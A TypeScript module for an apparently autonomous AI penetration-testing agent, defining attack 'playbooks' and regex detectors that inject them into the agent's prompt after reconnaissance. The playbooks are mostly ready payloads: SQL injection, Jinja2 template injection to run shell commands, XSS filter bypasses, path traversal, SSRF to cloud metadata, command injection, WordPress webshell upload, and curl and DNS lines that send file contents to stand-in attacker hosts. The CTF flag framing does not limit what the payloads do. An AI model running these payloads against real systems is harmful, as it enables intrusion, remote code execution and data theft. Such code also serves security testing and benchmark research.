/**
 * Dynamic vulnerability playbooks — injected AFTER initial reconnaissance,
 * not upfront in the system prompt.
 *
 * CurriculumPT showed +18pp from injecting vuln-type-specific methodology
 * at the right time (around the 30% budget checkpoint).
 *
 * Detection is pure pattern matching on tool result strings — no LLM call.
 */

// ── Playbook definitions ──

export const PLAYBOOKS: Record<string, string> = {
  sqli: `## SQLi Playbook
- Test all input fields with: ' OR 1=1--, " OR ""=", 1; DROP TABLE--
- Check for error-based: ' AND 1=CONVERT(int,@@version)--
- For blind: write Python timing script (see script templates)
- Enumerate: information_schema.tables, columns, then extract flag
- Try UNION SELECT with increasing column count
- Try different SQL dialects: MySQL (SLEEP), PostgreSQL (pg_sleep), SQLite (sqlite_version())
- If WAF blocks quotes, try: 1 OR 1=1, numeric injection without quotes`,

  ssti: `## SSTI Playbook
- Confirm with: {{7*7}}, \${7*7}, <%= 7*7 %>
- Identify engine: {{config}} (Jinja2), #{7*7} (Ruby), {{self}} (Twig)
- Escalate Jinja2: {{config.__class__.__init__.__globals__['os'].popen('cat /flag*').read()}}
- Escalate Django: {% load module %}{% module.dangerous %}
- Try {{self.__init__.__globals__.__builtins__.__import__('os').popen('id').read()}}
- If blocked, try: {{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}`,

  idor: `## IDOR Playbook
- Login with provided/default creds first
- Find any URL with an ID parameter: /api/users/1, /profile?id=1, /edit/1
- Try incrementing/decrementing IDs: 0, 2, 3, 999, admin
- Try changing user identifiers in POST body: user_id, owner_id, account_id
- Check both GET and POST/PUT endpoints for same resource
- Try negative IDs, very large IDs, string values where integers expected
- Check indirect IDOR: change ID in one endpoint, observe result in another`,

  xss: `## XSS Playbook

### Step 1: Identify Injection Points
- Use curl to fetch every page with forms or URL parameters
- Look for reflected output: inject a unique canary string (e.g. "pwnkit123xss") and check if it appears unescaped in the response HTML
- Check Content-Type headers — XSS only works when response is text/html
- Note which characters are reflected vs stripped: < > " ' / \` ( ) = on

### Step 2: Test with Basic Payloads via curl
- Reflected: <script>alert(1)</script> in all params (GET and POST)
- Event handlers: <img src=x onerror=alert(1)>, <svg onload=alert(1)>
- Stored XSS: inject in forms that save data (comments, profiles, settings), then visit the page where it renders
- DOM XSS: look for document.location, innerHTML, eval, document.write in client JS source

### Step 3: Confirm XSS with the Browser Tool (CRITICAL)
curl CANNOT execute JavaScript — you MUST use the browser tool to confirm XSS fires.
1. browser action=navigate url=TARGET_URL_WITH_PAYLOAD
2. Check the "dialogs" array in the response — if it contains "alert: 1" or similar, XSS is CONFIRMED
3. If no dialog fires, try: browser action=evaluate script="document.querySelector('img[onerror]') !== null"
4. For stored XSS: first inject via curl/submit_form, then navigate with browser to the render page
5. For DOM XSS: browser action=navigate to the page, then action=evaluate to check if payload executed

### Step 4: WAF/Filter Bypass Payloads
If basic payloads are blocked, try these bypasses IN ORDER:

**Angle brackets stripped/encoded:**
- " onfocus=alert(1) autofocus="
- ' onfocus='alert(1)' autofocus='
- " autofocus onfocus=alert(1)//

**script tag blocked:**
- <img src=x onerror=alert(1)>
- <svg/onload=alert(1)>
- <details open ontoggle=alert(1)>
- <body onload=alert(1)>
- <marquee onstart=alert(1)>
- <video><source onerror=alert(1)>
- <input onfocus=alert(1) autofocus>

**alert() blocked:**
- <img src=x onerror=confirm(1)>
- <img src=x onerror=prompt(1)>
- <img src=x onerror=print()>
- <img src=x onerror=window['al'+'ert'](1)>

**Encoding bypasses:**
- URL encoding: %3Cscript%3Ealert(1)%3C/script%3E
- Double URL encoding: %253Cscript%253Ealert(1)%253C%252Fscript%253E
- HTML entities: &lt;script&gt; (check if decoded server-side)
- Unicode: \\u003cscript\\u003ealert(1)\\u003c/script\\u003e
- Mixed case: <ScRiPt>alert(1)</ScRiPt>
- Null bytes: <scr%00ipt>alert(1)</script>

**Attribute context escapes:**
- " onmouseover=alert(1) x="
- '-alert(1)-'
- javascript:alert(1) (in href/src attributes)
- data:text/html,<script>alert(1)</script> (in iframe src)

**Template/framework specific:**
- {{constructor.constructor('alert(1)')()}} (AngularJS sandbox escape)
- \${alert(1)} (template literals)

### Step 5: Confirm and Save
- Every XSS MUST be confirmed via the browser tool dialogs array before saving
- Use save_finding with the exact payload, the URL, the parameter name, and the dialog output as evidence
- Include both the curl request that injects AND the browser confirmation`,

  ssrf: `## SSRF Playbook
- Test URL/webhook/callback inputs with: http://127.0.0.1, http://localhost
- Try cloud metadata: http://169.254.169.254/latest/meta-data/
- Try URL schemes: file:///etc/passwd, gopher://, dict://
- Try DNS rebinding: use your own domain or 0.0.0.0
- Bypass filters: use decimal IP (2130706433), IPv6 (::1), URL encoding
- Check for partial SSRF: can you control part of the URL?`,

  lfi: `## LFI / Path Traversal Playbook
- Test with: ../../../etc/passwd, ....//....//etc/passwd
- Try encoding: %2e%2e%2f, ..%252f, %c0%ae%c0%ae/
- Try null byte (legacy): ../../../etc/passwd%00.jpg
- Common targets: /etc/passwd, /flag, /flag.txt, /app/flag, /proc/self/environ
- If PHP: try php://filter/convert.base64-encode/resource=index.php
- Try absolute paths: /etc/passwd (no traversal needed if no prefix)`,

  auth_bypass: `## Auth Bypass Playbook
- Try accessing protected endpoints without auth headers/cookies
- Test default creds: admin/admin, admin/password, root/root, test/test
- JWT attacks: algorithm none, weak secret (try "secret", "password"), expired token
- SQL injection in login: admin' --, ' OR 1=1 --
- NoSQL injection: username[$ne]=x&password[$ne]=x
- Check for CORS misconfig allowing credential theft
- Try parameter pollution: add role=admin, is_admin=true to registration/profile update`,

  blind_exploitation: `## Blind Exploitation Playbook

When injection works but you can't see the output directly (blind SSTI, blind SQLi, blind LFI with WAF), use side-channels to confirm and extract data.

### Step 1: Confirm Blind Injection Exists
Before going deep, prove the payload is being evaluated. Use a differential test:
- Send a baseline request, record response body/length/timing
- Send an injection that SHOULD cause a detectable difference (sleep, error, boolean)
- Compare — consistent difference means the payload executes

### Step 2: Blind SSTI Techniques
When {{7*7}} does NOT render as 49, the engine may still evaluate but hide output.

**Time-based confirmation (Jinja2):**
- {{config.__class__.__init__.__globals__['os'].popen('sleep 5').read()}}
- {{''.__class__.__mro__[1].__subclasses__()[X]('sleep 5',shell=True)}}
- Measure response time — 5s+ delay confirms code execution

**Out-of-band (OOB) callback:**
- Set up a local listener first: \`python3 -m http.server 9000 &\` (bash background)
- Or use a public collaborator: webhook.site, requestbin.com, interactsh
- Payload: {{config.__class__.__init__.__globals__['os'].popen('curl http://ATTACKER:9000/$(cat /flag*|base64)').read()}}
- Then poll the listener log for the callback with exfiltrated data

**Error-based leak:**
- Trigger type errors that echo data: {{''.__class__.__mro__[1].__subclasses__()[INVALID_INDEX]}}
- Force different stack traces based on payload content

**Boolean-based with timing:**
- {{config if config.__class__.__name__[0]=='C' else ''}} — compare timing vs a control
- Binary-search one character at a time

**Side-channel file write (when OOB blocked):**
- {{config.__class__.__init__.__globals__['os'].popen('id > /tmp/out.txt').read()}}
- Then read /tmp/out.txt via a separate LFI or endpoint

**Django SSTI specifics:**
- Django templates are sandboxed harder — look for debug=True leak pages
- Try {% debug %} tag, or custom filter abuse if the app registers them
- Settings leak: {{settings.SECRET_KEY}} if debug context exposed

### Step 3: Blind LFI / WAF Bypass Techniques
When ../ is blocked by a filter or WAF.

**PHP filter wrappers (read source without traversal output):**
- php://filter/convert.base64-encode/resource=index.php
- php://filter/convert.base64-encode/resource=../config.php
- php://filter/read=string.rot13/resource=/etc/passwd
- Wrapper chains: php://filter/zlib.deflate|convert.base64-encode/resource=/flag

**Encoded traversal bypasses:**
- URL encode: %2e%2e%2f  → ../
- Double URL encode: ..%252f → ..%2f → ../
- Overlong UTF-8: ..%c0%af, ..%c1%9c
- Mixed: ..%2f..%2f..%2fetc%2fpasswd
- Backslash on Windows/Node: ..\\..\\etc\\passwd

**Null byte truncation (legacy PHP < 5.3):**
- ../../../etc/passwd%00
- ../../../etc/passwd%00.jpg (bypass extension append)

**Path normalization tricks:**
- /var/www/html/../../etc/passwd (absolute + backref)
- /./././etc/passwd
- ////etc/passwd (multiple slashes)
- /etc/./passwd
- /etc/passwd/. (trailing dot)

**Wrapper alternatives when php://filter blocked:**
- data:// with base64: data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOz8%2B
- expect:// for command execution
- zip:// for archive-based traversal
- phar:// for deserialization chain

### Step 4: Blind SQLi Techniques
When there's no output and no error messages.

**Time-based:**
- MySQL: ' AND SLEEP(5)-- , ' AND IF(1=1,SLEEP(5),0)--
- MySQL heavy query: ' AND BENCHMARK(5000000,MD5('x'))--
- PostgreSQL: '; SELECT pg_sleep(5)--
- MSSQL: '; WAITFOR DELAY '0:0:5'--
- SQLite: ' AND (SELECT CASE WHEN (1=1) THEN randomblob(100000000) ELSE 0 END)--

**Boolean-based:**
- Send ' AND 1=1-- and ' AND 1=2-- — compare response length/content
- Extract data one bit at a time: ' AND SUBSTRING((SELECT flag FROM flags),1,1)='a'--
- Use ASCII binary search: ' AND ASCII(SUBSTRING(...,1,1))>64--

**Out-of-band SQLi:**
- MySQL: ' UNION SELECT LOAD_FILE(CONCAT('\\\\\\\\',(SELECT flag),'.attacker.com\\\\a'))--
- MySQL write: ' UNION SELECT 'x' INTO OUTFILE '/tmp/out.txt'--
- PostgreSQL: '; COPY (SELECT flag FROM flags) TO PROGRAM 'curl http://ATTACKER/?d=...'--
- MSSQL: '; EXEC master..xp_dirtree '\\\\\\\\attacker.com\\\\a'--

**Error-based (when errors leak):**
- MySQL: ' AND extractvalue(1,concat(0x7e,(SELECT flag FROM flags)))--
- MySQL: ' AND updatexml(1,concat(0x7e,(SELECT version())),1)--
- PostgreSQL: ' AND 1=cast((SELECT flag FROM flags) as int)--

### Step 5: Out-of-Band Infrastructure Setup
Confirm exploitation via callbacks the agent can observe.

**Local HTTP listener (preferred when target can reach the agent):**
\`\`\`bash
# Start a background listener logging all requests
python3 -m http.server 9000 > /tmp/oob.log 2>&1 &
echo $! > /tmp/oob.pid
# After sending payload, check the log:
cat /tmp/oob.log
# Kill when done:
kill $(cat /tmp/oob.pid)
\`\`\`

**Nc listener for raw connections:**
\`\`\`bash
nc -lvnp 9001 > /tmp/nc.log 2>&1 &
\`\`\`

**DNS exfiltration (when only DNS egress):**
- Payload: curl http://$(cat /flag | base64).attacker.com/
- Observe DNS queries on controlled nameserver

**Confirmation loop:**
1. Start listener in background
2. Send injection payload with callback to listener
3. Wait 2-5 seconds for response
4. Read the listener log — if callback fired with expected data, exploit CONFIRMED
5. save_finding with the payload, the callback evidence, and extracted data

### Step 6: Combine Techniques
If a single blind channel is unreliable:
- Use time-based to confirm execution
- Then use OOB to exfiltrate data
- Fall back to boolean + binary search if both blocked
- Write output to a known file, read via a second endpoint`,

  cve_exploitation: `## CVE Exploitation Playbook

When the target runs a known product (WordPress, Drupal, Joomla, a named framework, etc.),
the fastest path to the flag is usually a public CVE rather than a novel bug. Fingerprint first,
then search for exploits, then execute the simplest working PoC.

### Step 1: Fingerprint Software and Versions
- Run: whatweb -a 3 <target>, nmap -sV -sC -p- <target>
- If WordPress suspected: wpscan --url <target> --enumerate vp,vt,u (vulnerable plugins, themes, users)
- Pull version hints from:
  - /readme.html, /readme.txt, /CHANGELOG, /CHANGELOG.txt, /VERSION
  - /package.json, /composer.json, /composer.lock
  - HTTP headers: X-Powered-By, Server, X-Generator, X-Drupal-Cache
  - HTML <meta name="generator">
  - JS/CSS asset URLs — plugin/theme slugs and ?ver= query strings leak versions
- WordPress-specific paths:
  - GET /wp-content/plugins/ (directory listing if enabled)
  - GET /wp-content/themes/
  - GET /wp-json/wp/v2/ (REST API root)
  - GET /wp-json/wp/v2/users (user enumeration)
  - GET /xmlrpc.php (should return "XML-RPC server accepts POST requests only.")
  - GET /wp-login.php, /wp-admin/
- Drupal-specific paths: /CHANGELOG.txt, /core/CHANGELOG.txt, /core/COPYRIGHT.txt
- Joomla-specific paths: /administrator/manifests/files/joomla.xml, /language/en-GB/en-GB.xml

### Step 2: Search for Known CVEs and Public PoCs
Once product + version are known, search with these commands:
- searchsploit <product> <version>
- searchsploit -m <exploit-id>    # mirror exploit file locally
- bash: ls /usr/share/exploitdb/exploits/ 2>/dev/null | grep -i <product>
- Check Metasploit: msfconsole -q -x "search <product>; exit"
- If you have web access: search "<product> <version> CVE" and "<plugin> exploit github"
- For WordPress plugins, the slug + version is usually enough: "wp <plugin-slug> <version> exploit"

### Step 3: WordPress-Specific Exploit Surface
Common WordPress attack vectors to try in order:
- **Vulnerable plugin arbitrary file upload** (highest ROI):
  - WP File Manager (CVE-2020-25213) — POST to /wp-content/plugins/wp-file-manager/lib/php/connector.minimal.php
  - Duplicator (CVE-2020-11738) — path traversal via installer.php
  - Ninja Forms (CVE-2020-12462)
  - Contact Form 7 (CVE-2020-35489) — unrestricted file upload
  - WooCommerce, Elementor, Yoast SEO — check versions against CVE database
- **Authenticated RCE** (if you can log in):
  - Theme editor: POST to /wp-admin/theme-editor.php (write PHP into theme file, then GET it)
  - Plugin editor: /wp-admin/plugin-editor.php
  - Plugin install: /wp-admin/plugin-install.php (upload malicious ZIP)
  - Media upload: POST to /wp-admin/admin-ajax.php?action=upload-attachment
- **XML-RPC**: /xmlrpc.php — brute force via system.multicall, pingback SSRF via pingback.ping
- **REST API**: /wp-json/wp/v2/users for enumeration, check for exposed endpoints that write data
- **Default/weak creds**: admin/admin, admin/password, admin/<sitename>

### Step 4: Exploit Selection and Execution
- Prefer the simplest exploitation first in this order:
  1. Arbitrary file upload -> webshell
  2. SQL injection -> credential dump or file write
  3. LFI -> source disclosure / /proc/self/environ
  4. Authenticated RCE via editor
  5. Deserialization / object injection
- When running a public PoC, read it first — understand what it does before firing it
- If PoC hard-codes a different target URL, patch it; if it needs creds, try defaults
- For file upload exploits, uploaded shells typically land in /wp-content/uploads/YYYY/MM/<name>.php

### Step 5: Post-Exploitation Flag Hunt
Once you have RCE (even blind), immediately try:
- cat /opt/flag.txt /opt/flag /flag /flag.txt /root/flag.txt /root/flag
- ls -la /home; cat /home/*/flag* 2>/dev/null
- cat /var/www/html/flag* /var/www/flag* 2>/dev/null
- cat /tmp/flag* 2>/dev/null
- find / -name 'flag*' -type f 2>/dev/null | head -50
- env | grep -i flag
- For blind RCE, chain with curl to exfiltrate: curl http://attacker/$(cat /opt/flag.txt | base64 -w0)
- For WordPress RCE, webshell is usually in /var/www/html/wp-content/uploads/ — flag is often /opt/flag.txt`,

  command_injection: `## Command Injection Playbook
- Test with: ; id, | id, \`id\`, $(id)
- Try chaining: ; cat /flag*, | cat /flag.txt, \`cat /flag\`
- If spaces blocked: use $IFS, {cat,/flag}, tab characters
- If semicolons blocked: try || id, && id, newline injection (%0a)
- Find and read flags: ; find / -name 'flag*' 2>/dev/null
- Check env vars: ; env | grep -i flag
- Try out-of-band: ; curl http://your-server/$(whoami)`,
};

// ── Vuln type indicators — pattern-match on tool result strings ──

interface VulnIndicator {
  /** Vuln type key into PLAYBOOKS */
  type: string;
  /** Regex patterns to match against tool result text */
  patterns: RegExp[];
}

const INDICATORS: VulnIndicator[] = [
  {
    type: "sqli",
    patterns: [
      /SQL syntax/i,
      /mysql_fetch/i,
      /sqlite3?\./i,
      /pg_query/i,
      /ORA-\d{5}/i,
      /ODBC SQL Server/i,
      /unclosed quotation mark/i,
      /syntax error.*near/i,
      /sql.*error/i,
      /database.*error/i,
      /SELECT\s+.*FROM\s+/i,
      /information_schema/i,
      /UNION\s+SELECT/i,
    ],
  },
  {
    type: "ssti",
    patterns: [
      /\{\{.*\}\}/,
      /\$\{.*\}/,
      /<%=.*%>/,
      /jinja/i,
      /mako/i,
      /twig/i,
      /freemarker/i,
      /thymeleaf/i,
      /template.*engine/i,
      /\b49\b/, // result of {{7*7}}
    ],
  },
  {
    type: "idor",
    patterns: [
      /\/api\/users?\/\d+/i,
      /\/profile\?id=/i,
      /\/user\/\d+/i,
      /\/account\/\d+/i,
      /\/edit\/\d+/i,
      /\/order\/\d+/i,
      /user_id/i,
      /owner_id/i,
      /account_id/i,
    ],
  },
  {
    type: "xss",
    patterns: [
      /<script/i,
      /onerror\s*=/i,
      /onload\s*=/i,
      /javascript:/i,
      /document\.cookie/i,
      /innerHTML/i,
      /document\.write/i,
      /reflected.*input/i,
      /Content-Type:.*text\/html/i,
      /<form[\s>]/i,
      /<input[\s>]/i,
      /<textarea[\s>]/i,
      /type=["']?text["']?/i,
      /name=["']?(search|query|q|comment|message|name|title|body|content|text|url|redirect|callback|return)/i,
      /\?[^=]+=.*</i,
      /xss/i,
      /cross.site/i,
      /sanitiz/i,
      /escape/i,
      /\.php\?/i,
    ],
  },
  {
    type: "ssrf",
    patterns: [
      /url[=:]\s*http/i,
      /webhook/i,
      /callback.*url/i,
      /fetch.*url/i,
      /proxy/i,
      /redirect.*url/i,
      /169\.254\.169\.254/,
      /metadata/i,
    ],
  },
  {
    type: "lfi",
    patterns: [
      /file[=:]/i,
      /path[=:]/i,
      /include[=:]/i,
      /template[=:]/i,
      /\.\.\/\.\.\//,
      /etc\/passwd/i,
      /\/proc\/self/i,
      /root:x:0:0/,
      /\[boot loader\]/i,
    ],
  },
  {
    type: "auth_bypass",
    patterns: [
      /login/i,
      /sign.?in/i,
      /auth/i,
      /password/i,
      /session/i,
      /jwt/i,
      /bearer/i,
      /unauthorized/i,
      /403/,
      /401/,
    ],
  },
  {
    type: "blind_exploitation",
    patterns: [
      /\bblind\b/i,
      /no output/i,
      /waf/i,
      /firewall/i,
      /filter.*block/i,
      /block.*filter/i,
      /request.*rejected/i,
      /forbidden/i,
      /\b403\b/,
      /not allowed/i,
      /suspicious/i,
      /malicious.*input/i,
      /identical.*respons/i,
      /same.*respons/i,
      /time.?based/i,
      /out.?of.?band/i,
      /\boob\b/i,
      /callback/i,
      /interactsh/i,
      /webhook\.site/i,
      /sleep\(/i,
      /pg_sleep/i,
      /benchmark\(/i,
      /php:\/\/filter/i,
      /convert\.base64-encode/i,
      /\.\.%2f/i,
      /\.\.%252f/i,
      /encoding.*restrict/i,
      /sanitiz.*input/i,
      /stripped/i,
    ],
  },
  {
    type: "command_injection",
    patterns: [
      /exec\s*\(/i,
      /system\s*\(/i,
      /popen\s*\(/i,
      /subprocess/i,
      /child_process/i,
      /shell.*true/i,
      /ping\s/i,
      /nslookup/i,
      /traceroute/i,
    ],
  },
  {
    type: "cve_exploitation",
    patterns: [
      // WordPress indicators
      /wp-content/i,
      /wp-includes/i,
      /wp-admin/i,
      /wp-json/i,
      /xmlrpc\.php/i,
      /wordpress/i,
      /wp-login/i,
      /\/wp-content\/plugins\//i,
      /\/wp-content\/themes\//i,
      // Drupal / Joomla
      /drupal/i,
      /joomla/i,
      /X-Drupal-Cache/i,
      // Generator / version disclosure
      /<meta\s+name=["']generator["']/i,
      /X-Generator:/i,
      /X-Powered-By:/i,
      /Server:\s*Apache\/[\d.]+/i,
      /Server:\s*nginx\/[\d.]+/i,
      // Common fingerprint files
      /readme\.html/i,
      /CHANGELOG\.txt/i,
      /composer\.json/i,
      /package\.json/i,
      // CVE / version strings
      /CVE-\d{4}-\d{4,7}/i,
      /\?ver=[\d.]+/i,
      /version[\s:=]+[\d]+\.[\d]+/i,
      // Plugin slugs commonly seen
      /contact-form-7/i,
      /woocommerce/i,
      /elementor/i,
      /yoast/i,
      /wp-file-manager/i,
      /duplicator/i,
      /ninja-forms/i,
    ],
  },
];

/**
 * Scan recent tool result text and return matching playbook types.
 * Returns at most 3 playbooks to avoid prompt bloat.
 */
export function detectPlaybooks(toolResultTexts: string[]): string[] {
  const combined = toolResultTexts.join("\n");
  const scores = new Map<string, number>();

  for (const indicator of INDICATORS) {
    let matchCount = 0;
    for (const pattern of indicator.patterns) {
      if (pattern.test(combined)) {
        matchCount++;
      }
    }
    if (matchCount >= 2) {
      scores.set(indicator.type, matchCount);
    }
  }

  // Sort by match count descending, take top 3
  return [...scores.entries()]
    .sort((a, b) => b[1] - a[1])
    .slice(0, 3)
    .map(([type]) => type);
}

/**
 * Build the playbook injection text for the given vuln types.
 */
export function buildPlaybookInjection(types: string[]): string {
  const sections = types
    .map((t) => PLAYBOOKS[t])
    .filter(Boolean);

  if (sections.length === 0) return "";

  return [
    "## Dynamic Playbook Injection",
    "",
    "Based on reconnaissance so far, these vulnerability-specific methodologies apply.",
    "Follow the steps below — they are tuned for the patterns detected in this target.",
    "",
    ...sections,
  ].join("\n");
}
